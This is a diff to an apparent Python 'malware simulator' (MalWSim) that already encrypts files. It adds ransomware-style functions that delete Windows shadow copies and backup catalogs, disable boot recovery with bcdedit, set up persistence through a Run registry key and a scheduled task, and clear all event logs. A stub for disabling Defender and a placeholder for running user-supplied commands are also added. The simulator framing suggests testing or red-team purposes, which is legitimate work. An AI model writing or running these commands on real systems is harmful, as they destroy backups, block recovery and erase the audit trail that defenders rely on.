@@ -47,10 +47,33 @@ def encrypt_file():
                 continue
 
 
-
-def additional_commands():
+def shadow_copy_delete():
+    os.system("vssadmin.exe delete shadows /all /quiet")
+    os.system("wmic shadowcopy delete")
+    os.system("wbadmin.exe delete catalog -quiet")
     pass
 
+def boot_config_mod():
+    os.system("bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no")
+    pass
+
+def autorun_modify():
+    os.system('reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v "MalWSim" /t REG_SZ /d "python C:\Windows\Temp\MalwSim.py" /f')
+    pass
+
+def schedule_task():
+    os.system('schtasks /create /tn "MalWSim" /tr "python C:\Windows\Temp\MalwSim.py" /sc minute /mo 30')
+    pass
+
+
+def defender_disable():
+    pass
+
+def log_clear_wevtutil():
+    os.system('wevtutil el | Foreach-Object {wevtutil cl "$_"}')
+
+def additional_commands(): #Takes commands from user and execute it 
+    pass
 
 create_setup()
 encrypt_file()
